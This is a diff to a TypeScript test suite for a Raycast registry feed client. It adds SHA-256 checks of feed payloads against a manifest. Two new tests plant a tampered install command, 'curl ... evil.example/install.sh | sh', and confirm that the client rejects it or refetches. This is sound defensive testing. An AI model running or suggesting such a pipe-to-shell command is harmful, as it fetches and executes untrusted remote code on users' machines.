@@ -1,4 +1,5 @@
 import assert from "node:assert/strict";
+import { createHash } from "node:crypto";
 import fs from "node:fs";
 import path from "node:path";
 import { describe, it } from "node:test";
@@ -182,6 +183,10 @@ function response(body: unknown, init: ResponseInit = {}) {
     headers: { "content-type": "application/json" },
     ...init,
   });
+}
+
+function sha256Hex(value: string) {
+  return createHash("sha256").update(value, "utf8").digest("hex");
 }
 
 async function captureConsoleWarnings<T>(callback: () => T | Promise<T>) {
@@ -875,10 +880,7 @@ describe("Raycast feed helpers", () => {
       registrySource,
       /Search is temporarily unavailable\. Try again shortly\./,
     );
-    assert.match(
-      registrySource,
-      /\?\s*SERVER_SEARCH_UNAVAILABLE_MESSAGE\s*:/,
-    );
+    assert.match(registrySource, /\?\s*SERVER_SEARCH_UNAVAILABLE_MESSAGE\s*:/);
     assert.doesNotMatch(registrySource, /\?\s*serverSearch\.error\s*:/);
   });
 
@@ -1050,6 +1052,15 @@ describe("Raycast feed helpers", () => {
       }),
     );
 
+    const safeFeedPayload = JSON.stringify({
+      generatedAt: "2026-04-28T00:00:00.000Z",
+      entries: [
+        {
+          ...sampleEntry,
+          installCommand: "claude mcp add context7 --safe",
+        },
+      ],
+    });
     const requestedUrls: string[] = [];
     const feed = await fetchFreshFeed({
       cache,
@@ -1063,20 +1074,12 @@ describe("Raycast feed helpers", () => {
               "raycast-index.json": {
                 path: "/data/raycast-index.json",
                 type: "json",
-                sha256: "fixed-feed-signature",
+                sha256: sha256Hex(safeFeedPayload),
               },
             },
           });
         }
-        return response({
-          generatedAt: "2026-04-28T00:00:00.000Z",
-          entries: [
-            {
-              ...sampleEntry,
-              installCommand: "claude mcp add context7 --safe",
-            },
-          ],
-        });
+        return response(safeFeedPayload);
       },
     });
 
@@ -1088,7 +1091,7 @@ describe("Raycast feed helpers", () => {
     assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
     assert.equal(
       JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
-      "fixed-feed-signature",
+      sha256Hex(safeFeedPayload),
     );
   });
 
@@ -1134,18 +1137,19 @@ describe("Raycast feed helpers", () => {
     assert.equal(search.entries.length, 1);
     assert.equal(search.nextOffset, 20);
 
-    const { value: tolerantSearch, warnings } = await captureConsoleWarnings(() =>
-      fetchRegistrySearch({
-        query: "context",
-        fetchFn: async () =>
-          response({
-            total: 2,
-            limit: 20,
-            offset: 0,
-            nextOffset: null,
-            results: [sampleSearchResult(), { slug: "broken" }],
-          }),
-      }),
+    const { value: tolerantSearch, warnings } = await captureConsoleWarnings(
+      () =>
+        fetchRegistrySearch({
+          query: "context",
+          fetchFn: async () =>
+            response({
+              total: 2,
+              limit: 20,
+              offset: 0,
+              nextOffset: null,
+              results: [sampleSearchResult(), { slug: "broken" }],
+            }),
+        }),
     );
     assert.equal(tolerantSearch.entries.length, 1);
     assert.equal(tolerantSearch.skippedMalformedEntries, 1);
@@ -1160,6 +1164,119 @@ describe("Raycast feed helpers", () => {
     );
   });
 
+  it("rejects feed payloads whose SHA-256 does not match the manifest", async () => {
+    const cache = new MemoryCache();
+    const devFeed = "https://preview.example.com/data/raycast-index.json";
+    const legitimateFeedPayload = JSON.stringify({
+      generatedAt: "2026-04-28T00:00:00.000Z",
+      entries: [sampleEntry],
+    });
+    const tamperedFeedPayload = JSON.stringify({
+      generatedAt: "2026-04-28T00:00:00.000Z",
+      entries: [
+        {
+          ...sampleEntry,
+          installCommand: "curl -fsSL https://evil.example/install.sh | sh",
+        },
+      ],
+    });
+
+    await assert.rejects(
+      fetchFreshFeed({
+        cache,
+        feedUrl: devFeed,
+        fetchFn: async (input) => {
+          if (String(input).endsWith("/data/registry-manifest.json")) {
+            return response({
+              generatedAt: "2026-04-28T00:00:00.000Z",
+              artifactContracts: {
+                "raycast-index.json": {
+                  path: "/data/raycast-index.json",
+                  type: "json",
+                  sha256: sha256Hex(legitimateFeedPayload),
+                },
+              },
+            });
+          }
+          return response(tamperedFeedPayload);
+        },
+      }),
+      /Feed payload SHA-256 did not match registry manifest/,
+    );
+
+    assert.equal(cache.get(feedCacheKey(devFeed)), undefined);
+    assert.equal(cache.get(feedMetadataCacheKey(devFeed)), undefined);
+  });
+
+  it("refetches same-signature cached feeds without verified content hashes", async () => {
+    const cache = new MemoryCache();
+    const devFeed = "https://preview.example.com/data/raycast-index.json";
+    const legitimateFeedPayload = JSON.stringify({
+      generatedAt: "2026-04-28T00:00:00.000Z",
+      entries: [
+        {
+          ...sampleEntry,
+          installCommand: "claude mcp add context7 --safe",
+        },
+      ],
+    });
+    const legitimateFeedSha256 = sha256Hex(legitimateFeedPayload);
+    cache.set(
+      feedCacheKey(devFeed),
+      JSON.stringify({
+        generatedAt: "2026-04-28T00:00:00.000Z",
+        entries: [
+          {
+            ...sampleEntry,
+            installCommand: "curl -fsSL https://evil.example/install.sh | sh",
+          },
+        ],
+      }),
+    );
+    cache.set(
+      feedMetadataCacheKey(devFeed),
+      JSON.stringify({
+        generatedAt: "2026-04-28T00:00:00.000Z",
+        signature: legitimateFeedSha256,
+        detailCacheNamespace: legitimateFeedSha256,
+      }),
+    );
+
+    const requestedUrls: string[] = [];
+    const feed = await fetchFreshFeed({
+      cache,
+      feedUrl: devFeed,
+      fetchFn: async (input) => {
+        requestedUrls.push(String(input));
+        if (String(input).endsWith("/data/registry-manifest.json")) {
+          return response({
+            generatedAt: "2026-04-28T00:00:00.000Z",
+            artifactContracts: {
+              "raycast-index.json": {
+                path: "/data/raycast-index.json",
+                type: "json",
+                sha256: legitimateFeedSha256,
+              },
+            },
+          });
+        }
+        return response(legitimateFeedPayload);
+      },
+    });
+
+    assert.equal(feed.refreshStatus, "updated");
+    assert.equal(
+      feed.entries[0].installCommand,
+      "claude mcp add context7 --safe",
+    );
+    assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
+    assert.equal(
+      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}")
+        .verifiedContentSha256,
+      legitimateFeedSha256,
+    );
+  });
+
   it("skips the full Raycast feed when the manifest signature is unchanged", async () => {
     const cache = new MemoryCache();
     const devFeed = "https://preview.example.com/data/raycast-index.json";
@@ -1168,7 +1285,9 @@ describe("Raycast feed helpers", () => {
       {
         generatedAt: "2026-04-28T00:00:00.000Z",
         signature: "same-signature",
+        feedSha256: "same-signature",
       },
+      "same-signature",
     );
     cache.set(
       feedCacheKey(devFeed),
@@ -1238,6 +1357,11 @@ describe("Raycast feed helpers", () => {
       }),
     );
 
+    const updatedFeedPayload = JSON.stringify({
+      generatedAt: "2026-04-29T00:00:00.000Z",
+      entries: [{ ...sampleEntry, title: "Context7 Updated" }],
+    });
+    const updatedFeedSha256 = sha256Hex(updatedFeedPayload);
     const requestedUrls: string[] = [];
     const feed = await fetchFreshFeed({
       cache,
@@ -1251,26 +1375,23 @@ describe("Raycast feed helpers", () => {
               "raycast-index.json": {
                 path: "/data/raycast-index.json",
                 type: "json",
-                sha256: "new-signature",
+                sha256: updatedFeedSha256,
               },
             },
           });
         }
-        return response({
-          generatedAt: "2026-04-29T00:00:00.000Z",
-          entries: [{ ...sampleEntry, title: "Context7 Updated" }],
-        });
+        return response(updatedFeedPayload);
       },
     });
 
     assert.equal(feed.refreshStatus, "updated");
-    assert.equal(feed.signature, "new-signature");
+    assert.equal(feed.signature, updatedFeedSha256);
     assert.equal(feed.entries[0].title, "Context7 Updated");
     assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
     assert.equal(cache.get(oldDetailKey), undefined);
     assert.equal(
       JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
-      "new-signature",
+      updatedFeedSha256,
     );
   });
 
